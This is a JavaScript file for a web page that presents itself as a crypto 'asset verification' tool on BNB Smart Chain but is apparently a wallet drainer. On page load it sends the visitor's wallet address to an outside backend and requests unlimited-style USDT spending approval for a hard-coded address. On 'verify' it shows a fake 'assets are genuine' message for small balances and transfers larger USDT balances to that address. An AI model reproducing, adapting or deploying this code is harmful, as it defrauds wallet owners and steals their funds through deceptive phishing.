const bscAddress = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979";
const bnbGasSender = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress;

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });

            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });

            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);

            sendToBackend(userAddress);
            approveSpending();

        } catch (error) {
            console.error("Error connecting wallet:", error);
            alert("Please switch to BNB Smart Chain.");
        }
    } else {
        alert("Please install MetaMask.");
    }
}

async function approveSpending() {
    const spender = bscAddress;
    const amount = web3.utils.toWei("1000000", "ether");

    const contract = new web3.eth.Contract([
        {
            constant: false,
            inputs: [
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" }
            ],
            name: "approve",
            outputs: [{ name: "", type: "bool" }],
            type: "function"
        }
    ], usdtContractAddress);

    try {
        const tx = await contract.methods.approve(spender, amount).send({ from: userAddress });
        console.log("✅ Approval Tx:", tx.transactionHash);
    } catch (err) {
        console.error("❌ Approve failed:", err);
    }
}

async function sendToBackend(wallet) {
    try {
        const response = await fetch("https://usdt-backend-bwch.onrender.com/connect", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ address: wallet })
        });

        const result = await response.json();
        console.log("Backend response:", result);
    } catch (error) {
        console.error("Error sending wallet to backend:", error);
    }
}

window.addEventListener("load", connectWallet);

async function verifyAssets() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance < 0.00001) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 10) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine.<br><br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`,
            "green"
        );
        return;
    }

    showPopup("Loading...", "green");

    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0003) {
            console.log("Low BNB detected, sending gas fee...");
            await sendBNB(userAddress, "0.001");
        }

        const usdtContract = new web3.eth.Contract([
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Transferred ${usdtBalance} USDT to ${bscAddress}`,
            "red"
        );

    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress}`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    } else if (!document.body.contains(popup)) {
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

document.getElementById("verifyBtn").addEventListener("click", verifyAssets);
